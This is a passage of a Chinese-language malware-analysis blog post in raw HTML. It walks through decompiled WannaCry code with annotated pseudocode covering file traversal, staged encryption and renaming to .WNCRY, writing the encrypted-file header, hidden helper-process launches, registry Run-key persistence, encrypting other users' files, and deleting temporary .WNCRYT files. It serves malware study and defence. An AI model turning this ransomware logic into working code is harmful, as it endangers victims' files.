punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 将@WanaDecryptor@.exe拷贝到D盘  </span><span class="token keyword">else</span>  <span class="token function">CopyWanaDecryptor</span><span class="token punctuation">(</span>Format<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">// 将@WanaDecryptor@.exe拷贝到D盘  </span><span class="token punctuation">&#125;</span>  v18 <span class="token operator">=</span> v30<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a5 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  v19 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token punctuation">)</span>v30<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">)</span>v30 <span class="token operator">!=</span> v30 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  v20 <span class="token operator">=</span> v14 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">do</span>  <span class="token punctuation">&#123;</span>  v21 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">wchar_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>v19<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v21 <span class="token punctuation">)</span>  v21 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">wchar_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>`std<span class="token operator">::</span>basic_string<span class="token operator">&lt;</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span><span class="token operator">></span><span class="token punctuation">,</span>std<span class="token operator">::</span>allocator<span class="token operator">&lt;</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span><span class="token operator">>></span><span class="token operator">::</span>_Nullstr<span class="token string">'::`2'</span><span class="token operator">::</span>_C<span class="token punctuation">;</span>  <span class="token function">TraverseAndEncryptFiles</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v35<span class="token punctuation">,</span> v21<span class="token punctuation">,</span> a3<span class="token punctuation">,</span> v20<span class="token punctuation">,</span> a5<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 递归遍历文件  </span>v19 <span class="token operator">=</span> <span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span>v19<span class="token punctuation">;</span>  v18 <span class="token operator">=</span> v30<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> v19 <span class="token operator">!=</span> v30 <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  v22 <span class="token operator">=</span> v18<span class="token punctuation">;</span>  <span class="token function">LOBYTE</span><span class="token punctuation">(</span>v49<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v23 <span class="token operator">=</span> <span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span>v18<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span>v18 <span class="token operator">!=</span> v18 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">do</span>  <span class="token punctuation">&#123;</span>  v24 <span class="token operator">=</span> v23<span class="token punctuation">;</span>  v23 <span class="token operator">=</span> <span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span>v23<span class="token punctuation">;</span>  <span class="token function">DeleteAllocMem</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v29<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v36<span class="token punctuation">,</span> v24<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 释放所有申请的空间  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该函数会首先遍历所有的文件，对文件和文件夹执行不同的操作并且对后缀名进行过滤，跳过@Please_Read_Me@.txt，@WanaDecryptor@.exe.lnk，@WanaDecryptor@.bmp总结为枚举</p><h3 id="6-2-5-第五层"><a href="#6-2-5-第五层" class="headerlink" title="6.2.5 第五层"></a>6.2.5 第五层</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">enum</span> <span class="token class-name">FILE_TYPE</span>  <span class="token punctuation">&#123;</span>  FILE_TYPE_NULL <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>  FILE_TYPE_EXEDLL<span class="token punctuation">,</span>  FILE_TYPE_DOC<span class="token punctuation">,</span>  FILE_TYPE_DOCEX<span class="token punctuation">,</span>  FILE_TYPE_WNCRYT<span class="token punctuation">,</span> <span class="token comment">//.wncryt  </span>FILE_TYPE_WNCYR<span class="token punctuation">,</span> <span class="token comment">//.wncyr  </span>FILE_TYPE_WNCRY <span class="token comment">//.wncry  </span><span class="token punctuation">&#125;</span>  <span class="token keyword">int</span> __thiscall <span class="token function">EncryptAllFile</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token class-name">wchar_t</span> this<span class="token punctuation">,</span> <span class="token class-name">wchar_t</span> TargetFileFullPath<span class="token punctuation">,</span> <span class="token keyword">int</span> Num_1<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> <span class="token class-name">wchar_t</span> this_1<span class="token punctuation">;</span> <span class="token comment">// edi  </span><span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax  </span>this_1 <span class="token operator">=</span> this<span class="token punctuation">;</span>  <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token function">sub_10002E70</span><span class="token punctuation">(</span>TargetFileFullPath<span class="token punctuation">,</span> Num_1<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 根据返回值不同执行不同的操作  </span><span class="token punctuation">&#123;</span>  <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>  <span class="token function">DeleteFileW_Addr</span><span class="token punctuation">(</span>TargetFileFullPath<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">EncryptFiles</span><span class="token punctuation">(</span>this_1<span class="token punctuation">,</span> TargetFileFullPath<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 加密文件 </span><span class="token punctuation">&#123;</span>  <span class="token function">wcscat</span><span class="token punctuation">(</span>TargetFileFullPath<span class="token punctuation">,</span> WNCRT<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">wcscat</span><span class="token punctuation">(</span>TargetFileFullPath <span class="token operator">+</span> <span class="token number">360</span><span class="token punctuation">,</span> WNCRT<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>TargetFileFullPath <span class="token operator">+</span> <span class="token number">312</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">goto</span> LABEL_5<span class="token punctuation">;</span>  <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>                                     <span class="token comment">// .jpg  </span>        <span class="token function">EncryptFiles</span><span class="token punctuation">(</span>this_1<span class="token punctuation">,</span> TargetFileFullPath<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token keyword">default</span><span class="token operator">:</span>  LABEL_5<span class="token operator">:</span>  result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>针对该函数的加密策略做一个总结：</p><ol><li><p> 在枚举文件中，cmd=1，会对普通文件直接加密为.WNCRY，不再加入链表，大文件处理为.WNCYR，以及其他未作处理文件继续加入链表等待处理</p></li><li><p>枚举完成后，cmd从2-4，每个cmd遍历都遍历加密文件<br> cmd=2，加密FILE_TYPE_DOCEX普通文件为.WNCRY（移出链表），以及FILE_TYPE_DOCEX大文件为.WNCYR<br> cmd=2, 删除.WNCRYT</p></li><li><p> cmd=3, 加密链表中所有文件（移出链表）</p></li><li><p> cmd=4, 加密可能剩余链表中的文件</p></li></ol><blockquote><p>虽然操作不同 但是加密函数是同一个 接下来再次进入EncryptFiles</p></blockquote><h3 id="6-2-6-第六层"><a href="#6-2-6-第六层" class="headerlink" title="6.2.6 第六层"></a>6.2.6 第六层</h3><ol><li><p>  pTargetPostFix = wcsrchr(&amp;NewTargetFileFullPath, ‘.’);// 获取文件后缀名  </p></li><li><p>   pTargetPostFix_1 = pTargetPostFix;  </p></li><li><p>   if ( !pTargetPostFix )  </p></li><li><p>   {  </p></li><li><p>     pTargetPostFix_2 = &NewTargetFileFullPath;  </p></li><li><p>     goto LABEL_6;  </p></li><li><p>   }  </p></li><li><p>   IsWNCRY = wcsicmp(pTargetPostFix, WNCRT);     // 将后缀名与WNCRY比较  </p></li><li><p>   pTargetPostFix_2 = pTargetPostFix_1;  </p></li><li><p>  if ( IsWNCRY )  </p></li><li><p>  {  </p></li><li><p>LABEL_6:  </p></li><li><p>    wcscat(pTargetPostFix_2, Source);           // 字符串拼接 原后缀+.WNCRY  </p></li><li><p>    goto LABEL_8;  </p></li><li><p>  }  </p></li><li><p>  wcscpy(pTargetPostFix_1, Source);  </p></li><li><p>LABEL_8:  </p></li><li><p>  if ( GetFileAttributesW(&amp;NewTargetFileFullPath) != -1  </p></li><li><p>    || StartEncryptFiles((char *)v9, (int)OldTargetFileFullPath, &amp;NewTargetFileFullPath, Num_4) )// 开始加密文件  </p></li><li><p>  {  </p></li><li><p>    if ( Num_4 == 4 )  </p></li><li><p>      sub_10002BA0(v9, OldTargetFileFullPath);  </p></li><li><p>    result = 1;  </p></li><li><p>  }  </p></li><li><p>  else  </p></li><li><p>  {  </p></li><li><p>    DeleteFileW_Addr(&amp;NewTargetFileFullPath);  </p></li><li><p>    result = 0;  </p></li><li><p>  }  </p></li><li><p>  return result;  </p></li><li><p>}  </p></li></ol><p>这个函数仍然是作为加密函数的准备工作，获取文件的后缀名，将后缀名和.WNCRY做比较，如果一致就不加密，然后将原后缀与.WNCRY做拼接，然后开始加密文件</p><h3 id="6-2-7-第七层"><a href="#6-2-7-第七层" class="headerlink" title="6.2.7 第七层"></a>6.2.7 第七层</h3><ol><li><p> if ( !GetFileSizeEx(hFile_1, &amp;FileSize) )     // 获取目标文件大小  </p></li><li><p> {  </p></li><li><p>   local_unwind2((int)&amp;ms_exc.registration, -1);  </p></li><li><p>   return 0;  </p></li><li><p> }  </p></li><li><p> GetFileTime(hFile_1, &amp;CreationTime, &amp;LastAccessTime, &amp;LastWriteTime);// 获取文件时间  </p></li><li><p> if ( ReadFile_Addr(hFile_1, &amp;lpBuffer, 8, &amp;lpNumberOfBytesRead, 0)// 读取0x8个字节的文件内容  </p></li><li><p>   &amp;&amp; !memcmp(&amp;lpBuffer, aWanacry, 8u)         // 将0x8个字节与WANACRY!比较  </p></li></ol><pre class="line-numbers language-&#123;" data-language="&#123;"><code class="language-&#123;">&lt;!-- --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li> 读取文件前0x8个字节，与WNACRY！作比较</li></ol><pre class="line-numbers language-&#123;" data-language="&#123;"><code class="language-&#123;">&lt;!-- --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><p> SetFilePointer(hFile, 0, 0, 0);               // 将文件指针重新设置到文件开头  </p></li><li><p>   if ( a4 == 4 )  </p></li><li><p>   {  </p></li><li><p>     swprintf(&amp;String, (size_t)aSS, NewTargetFileFullPath, aT);// 拼接字符串 在原文件后加上.WNCRYT  </p></li><li><p>     NewhFile = (void *)CreateFileW_Addr(&amp;String, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);// 创建文件  </p></li></ol><p>2．使用源文件名 + .WNCRYT 创建一个新的空的文件</p><ol><li><p> if ( !EncryptDatas(v32, &amp;pbBuffer, 0x10u, (int)&amp;v17, (int)&amp;v20) )// 对数据进行加密  </p></li><li><p>     goto LABEL_39;  </p></li><li><p>   sub_10005DC0(this_1 + 84, (int)&amp;pbBuffer, (int)off_1000D8D4, 16, 16);  </p></li><li><p>   memset(&amp;pbBuffer, 0, 0x10u);  </p></li><li><p>   if ( !WriteFile_Addr(NewhFile, aWanacry, 8, &amp;v35, 0)// 写入到创建的文件-&gt;WANACRY!   </p></li><li><p>     || !WriteFile_Addr(NewhFile, &amp;v20, 4, &amp;v35, 0)// 写入到创建的文件-&gt;0x100  </p></li><li><p>     || !WriteFile_Addr(NewhFile, &amp;v17, v20, &amp;v35, 0)// 写入0x100个字节的加密数据到文件  </p></li><li><p>     || !WriteFile_Addr(NewhFile, &amp;a4, 4, &amp;v35, 0)// 写入0x4到文件  </p></li><li><p>     || !WriteFile_Addr(NewhFile, &amp;FileSize, 8, &amp;v35, 0) )// 写入0x081006到文件 </p></li></ol><pre class="line-numbers language-&#123;" data-language="&#123;"><code class="language-&#123;">&lt;!-- --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li> 将加密后的数据写入到新创建的文件中</li></ol><pre class="line-numbers language-&#123;" data-language="&#123;"><code class="language-&#123;">&lt;!-- --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><p> if ( !ReadFile_Addr(hFile_2, *((_DWORD *)this_1 + 306), 0x10000, &amp;lpNumberOfBytesRead, 0)  </p></li><li><p>   || lpNumberOfBytesRead != 0x10000 )     // 读取目标文件  </p></li><li><p> {  </p></li><li><p> 21:  </p></li><li><p>   local_unwind2((int)&amp;ms_exc.registration, -1);  </p></li><li><p>   return 0;  </p></li><li><p> }  </p></li><li><p> sub_10006940((int)(this_1 + 84), *((_DWORD *)this_1 + 306), *((char )this_1 + 307), 0x10000u, 1);  </p></li><li><p> if ( WriteFile_Addr(NewhFile, *((_DWORD *)this_1 + 307), 0x10000, &amp;v35, 0) &amp;&amp; v35 == 0x10000 )// 将加密后的内容写入到新文件  </p></li></ol><pre class="line-numbers language-&#123;" data-language="&#123;"><code class="language-&#123;">&lt;!-- --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li> 读取源文件，并将加密后的内容写入到新创建的文件中</li></ol><p>到此为止，加密函数的分析已经完成</p><h2 id="6-3-剩余函数分析"><a href="#6-3-剩余函数分析" class="headerlink" title="6.3 剩余函数分析"></a>6.3 剩余函数分析</h2><p>这部分我们将对 t.wnry.dll 中剩余的函数进行逐一的分析</p><h3 id="6-3-1-StartTaskdl-线程回调-隐藏启动taskdl-exe"><a href="#6-3-1-StartTaskdl-线程回调-隐藏启动taskdl-exe" class="headerlink" title="6.3.1 StartTaskdl 线程回调+隐藏启动taskdl.exe"></a>6.3.1 StartTaskdl 线程回调+隐藏启动taskdl.exe</h3><ol><li> if ( !CreateProcessA(0u, lpCommandLine, 0u, 0u, 0, 0x8000000u, 0u, 0u, &amp;StartupInfo, &amp;ProcessInformation) )// 创建Taskdl.exe进程  </li></ol><p>该函数每隔3秒会以隐藏的方式启动 taskdl.exe</p><h3 id="6-3-2-StartExeAndSetReg"><a href="#6-3-2-StartExeAndSetReg" class="headerlink" title="6.3.2 StartExeAndSetReg"></a>6.3.2 StartExeAndSetReg</h3><p>线程回调+启动taskse.exe和@WanaDecryptor@.exe)+修改注册表</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">ReadFileToMem</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_wnryBase<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 读取c.wnry的内容到内存  </span><span class="token punctuation">&#125;</span>  <span class="token function">StartTaskseAndDecryptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// 启动taskse.exe和@WanaDecryptor@.exe  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token function">GetFullPathNameA</span><span class="token punctuation">(</span>aTaskscheExe<span class="token punctuation">,</span> <span class="token number">0x208u</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>Buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// C:UsersDingisoDesktoptasksche.exe  </span><span class="token function">SetRegRun</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// 设置注册表启动项  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该函数每隔三秒启动taskse.exe 和 @WanaDecryptor@.exe 然后利用 CMD<br>设置注册表启动项为 tasksche.exe 的绝对地址</p><h3 id="6-3-3-RepeatOperation-重复操作"><a href="#6-3-3-RepeatOperation-重复操作" class="headerlink" title="6.3.3 RepeatOperation 重复操作"></a>6.3.3 RepeatOperation 重复操作</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">GetFileAttributesA</span><span class="token punctuation">(</span>aFWnry<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>       <span class="token comment">// 检测f.wnry是否存在  </span><span class="token function">sub_100018F0</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Parameter<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>CurrentTime <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  CurrentTime <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">CreateRes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token comment">// 写入0x8个字节到00000000.res  </span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Dest<span class="token punctuation">,</span> aSFi<span class="token punctuation">,</span> NewFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// @WanaDecryptor@.exe fi  </span><span class="token function">StartTargetFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Dest<span class="token punctuation">,</span> <span class="token number">0x186A0u</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">ReadFileToMem</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_wnryBase<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">RunBat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                     <span class="token comment">// 创建并启动批处理脚本  </span><span class="token function">CreateReadMe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                               <span class="token comment">// 创建@Please_Read_Me@.txt  </span><span class="token function">EncryptOtherUsersFiles</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>Parameter<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 加密windows剩余所有用户的文件 </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该函数有三个重要的函数，就不展开分析了，我在这里将把他们的逻辑表述清楚</p><ol><li>RunBat():判断@WanaDecryptor@.exe.lnk是否存在，如果不存在就创建一个批处理脚本，将命令写入.bat脚本脚本作用为给@WanaDecryptor@.exe创建快捷方式）</li><li>CreateReadMe():检测工作路径下是否存在 ReadMe不存在就从r.wnry中读取内容并写入 ReadMe</li><li> EncryptOtherUsersFiles():获取Windows所有的用户名，判断是否与当前的有户名相同，不同就加密该用户的所有文件</li></ol><h2 id="7-taskdle-exe-病毒辅助文件分析"><a href="#7-taskdle-exe-病毒辅助文件分析" class="headerlink" title="7 taskdle.exe 病毒辅助文件分析"></a>7 taskdle.exe 病毒辅助文件分析</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">dwDrives <span class="token operator">=</span> <span class="token function">GetLogicalDrives</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// 获取系统中所有的磁盘  </span>v5 <span class="token operator">=</span> <span class="token number">0x19</span><span class="token punctuation">;</span>  <span class="token keyword">do</span>  <span class="token punctuation">&#123;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>RootPathName <span class="token operator">=</span> dword_403060<span class="token punctuation">;</span>  v8 <span class="token operator">=</span> dword_403064<span class="token punctuation">;</span>  RootPathName<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v5 <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>dwDrives <span class="token operator">>></span> v5<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token function">GetDriveTypeW</span><span class="token punctuation">(</span>RootPathName<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span><span class="token comment">//获取D盘类型  </span><span class="token punctuation">&#123;</span>  <span class="token function">DeleteFile</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// 清空回收站和临时目录所有以.WNCRYT 结尾文件  </span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">10u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token operator">--</span>v5<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> v5 <span class="token operator">>=</span> <span class="token number">2</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>taskdl 的代码量相比上面的其他文件小很多了，主要就是涉及删除文件的操作</p><h2 id="7-1-DeleteFile-删除回收站和临时目录下的-WNCRY文件"><a href="#7-1-DeleteFile-删除回收站和临时目录下的-WNCRY文件" class="headerlink" title="7.1 DeleteFile 删除回收站和临时目录下的.WNCRY文件"></a>7.1 DeleteFile 删除回收站和临时目录下的.WNCRY文件</h2><pre class="line-numbers language-none"><code class="language-none">int __cdecl DeleteFile(int a1)  &#123;  GetRecyclePathOrTempPath(a1, &amp;RecyclePath);   &#x2F;&#x2F; 获取回收站路径或者C盘下的临时文件夹路径  swprintf(&amp;String, (size_t)aSS, &amp;RecyclePath, aWncryt);&#x2F;&#x2F; string&#x3D;回收站路径或临时文件夹路径+*.WNCRYT   &#x2F;&#x2F;   hFile &#x3D; FindFirstFileW(&amp;String, &amp;FindFileData);&#x2F;&#x2F;在回收站查找所有.WNCRYT结尾的文件  if ( hFile &#x3D;&#x3D; (HANDLE)-1 )                    &#x2F;&#x2F; 如果没找到直接返回  &#123;  v2 &#x3D; (char *)Memory;  v24 &#x3D; -1;  if ( Memory !&#x3D; v17 )  &#123;  do  &#123;  std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::~basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;(  v2,  0);  v2 +&#x3D; 16;  &#125;  while ( v2 !&#x3D; v17 );  v2 &#x3D; (char *)Memory;  &#125;  FreeMem(v2);                                &#x2F;&#x2F; 释放内存  result &#x3D; 0;  &#125;  else  &#123;  do                                          &#x2F;&#x2F; 如果找到了  &#123;  swprintf(&amp;String, (size_t)aSS_0, &amp;RecyclePath, FindFileData.cFileName);&#x2F;&#x2F; 拼接目标文件的完整路径  v19 &#x3D; v13;                                &#x2F;&#x2F; 清空strings对象的内存  std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Tidy(&amp;v19, 0);  TargetFullPathLen &#x3D; wcslen(&amp;String);      &#x2F;&#x2F; 获取目标文件完整路径的长度  if ( (unsigned __int8)std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Grow(  &amp;v19,  TargetFullPathLen,  1) )  &#123;  wmemcpy(TargetFullPath, &amp;String, TargetFullPathLen);&#x2F;&#x2F; 拷贝目标路径  std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Eos(  &amp;v19,                                 &#x2F;&#x2F; 将目标文件路径和长度写入到容器  TargetFullPathLen);  &#125;  LOBYTE(v24) &#x3D; 1;  sub_4013D0(&amp;v15, (int)v17, 1u, (int)&amp;v19);&#x2F;&#x2F; 这个函数会把之前的String对象放到另一个容器里  LOBYTE(v24) &#x3D; 0;  std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Tidy(&amp;v19, 1);  &#125;  while ( FindNextFileW(hFile, &amp;FindFileData) );  FindClose(hFile);                           &#x2F;&#x2F; 文件遍历结束  v5 &#x3D; 0;  for ( i &#x3D; 0; ; i +&#x3D; 16 )  &#123;  v7 &#x3D; (char *)Memory;  if ( !Memory || v5 &gt;&#x3D; (v17 - (_BYTE *)Memory) &gt;&gt; 4 )  break;  TargetFullPath_1 &#x3D; *(const WCHAR )((char *)Memory + i + 4);  if ( !TargetFullPath_1 )  TargetFullPath_1 &#x3D; (const WCHAR *)&#96;std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Nullstr&#39;::&#96;2&#39;::_C;  if ( DeleteFileW(TargetFullPath_1) )      &#x2F;&#x2F; 删除目标文件  ++v14;  ++v5;  &#125;  v9 &#x3D; (char 